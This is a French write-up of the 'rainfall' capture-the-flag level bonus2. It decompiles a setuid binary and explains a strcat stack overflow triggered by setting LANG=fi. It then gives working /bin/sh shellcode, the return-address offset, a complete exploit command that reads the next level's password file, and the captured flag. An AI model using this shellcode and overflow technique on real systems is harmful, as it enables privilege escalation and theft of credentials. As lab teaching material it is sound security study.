 # rainfall : [bonus2]

Observations:
---

#### Source décompilée:
```c
int __cdecl greetuser(char src)
{
	char dest[22];

	switch ( language )
	{
		case 1:
			strcpy((char *)&dest, "Hyvää päivää ");	// size 18
			break;
		case 2:
			strcpy((char *)&dest, "Goedemiddag! ");	// size 13
			break;
		case 0:
			strcpy((char *)&dest, "Hello ");		// size 6
			break;
	}
	strcat((char *)&dest, &src);
	return puts((const char *)&dest);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
	char v4[76];
	char dest[76];
	char *v6;

	if ( argc != 3 )
		return 1;
	memset(dest, 0, sizeof(dest));
	strncpy(dest, argv[1], 0x28u);
	strncpy(&dest[40], argv[2], 0x20u);
	v6 = getenv("LANG");
	if ( v6 )
	{
		if ( !memcmp(v6, "fi", 2u) )
		{
			language = 1;
		}
		else if ( !memcmp(v6, "nl", 2u) )
		{
			language = 2;
		}
	}
	qmemcpy(v4, dest, sizeof(v4));
	return greetuser(v4[0]);
}
```

#### Entrées du programme:
| Nom | Description |
| --- | ----------- |
| `argv[1]` | Une chaîne de caractères |
| `argv[2]` | Une chaîne de caractères |


#### Détails du programme:
```bash
-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
```

#### Fonctions:

| Nom | Description |
| --- | ----------- |
| `<main>` | Copie les **40** premiers octets de `argv[1]` dans le tableau `dest` de **76** octets, puis copie les **32** premiers <br> octets de `argv[2]` dans `dest` + **40**. <br> Ensuite elle récupère la variable environnement `LANG` et change la valeur de la variable globale `language` en conséquence. <br> Le contenue du tableau `dest` est copié dans le tableau `v4` de la même taille soit **76** octets. <br> Pour finir la fonction `<greetuser>` est appelée. |
| `<greetuser>` | Selon la valeur de `langage` la fonction copie la chaîne de caractères correspondante dans le tableau `dest` de **22** octets. <br> Grace à `<strcat>` elle concatène ensuite le tableau `dest` et le tableau `src` qui est un paramètre d'entrée. <br> La fonction fini par afficher à l'écran le tableau `dest` puis retourne. |


#### Conclusions:
Il y a une faille majeur dans la fonction `<greetuser>`, en effet si nous choisisons le langage `fi` le nombre d'octets utilisés dans la chaîne seras égale à **18**. \
C'est important car cela décale suffisament l'emplacement d'insertion du `<strcat>` ce qui suffit pour écraser l'adresse de retour de la fonction. \
Nous permettant de changer l'ordre d'exécution du programme vers le tableau `dest` qui contiendras notre injection de code. 

----
Résolution:
----
Nous allons injecter du code dans le tableau `dest` du main grace aux appels successifs à `<strncpy>`. \
Ce code va ensuite être copié dans le tableau `dest` de la fonction `<greetuser>` grace au `<strcat>`. \
Si nous calculons nous pouvons trouver l'emplacement de l'adresse de retour dans la fonction `<greetuser>` \
et donc le déplacement nécéssaire pour l'atteindre à partir du talbleau `dest` de la fonction `<greetuser>`.

```
ADR_DEST_GREETUSER	= 0xbffffce0
ADR_RETAD_GREETUSER	= 0xbffffd2c

DECALAGE_TO_RETADDR	= ADR_RETAD_GREETUSER - ADR_DEST_GREETUSER
					= 0x4c-> 76
```

Il suffit donc maintenant de créer la commande:
Tout d'abord nous plaçons le code shell de la fonction voulue de **24** octets, \
suivis de **16** caractères de bourrage dans le premier argument. \
Dans le deuxième il y aura **18** caractères de bourrage suivis de l'adresse de retour pointant vers le tableau `dest` de la fonction `<greetuser>` + **18** \
pour passer le message de bienvenue copié par la fonction. \
N'oublions pas de vider notre environnement et de laisser uniquement la variable `LANG` à `fi` avant d'exécuter notre commande.

> Les variables environement sont stockées dans la pile, décalant tout les adresses de cette dernière. \
> Un simple argument plus grand changerais toute les adresses !

#### Injection:
```asm
# La fonction injectée appelle <system> avec '/bin/sh' en paramètre:

0:  6a 0b                   	push   0xb
2:  58                      	pop    eax
3:  31 f6                   	xor    esi,esi
5:  56                      	push   esi
6:  68 2f 2f 73 68          	push   0x68732f2f
b:  68 2f 62 69 6e          	push   0x6e69622f
10: 89 e3                   	mov    ebx,esp
12: 31 c9                   	xor    ecx,ecx
14: 89 ca                   	mov    edx,ecx
16: cd 80                   	int    0x80
```

#### Commande:
```bash
echo $(echo $(unset $(env | cut -d= -f1); export LANG=fi; /home/user/bonus2/bonus2 $(/usr/bin/python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(/usr/bin/python -c "print('b'*18 + '\xbf\xff\xfc\xf2'[::-1])") <<< 'cat /home/user/bonus3/.pass'))
```

**Flag :** 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587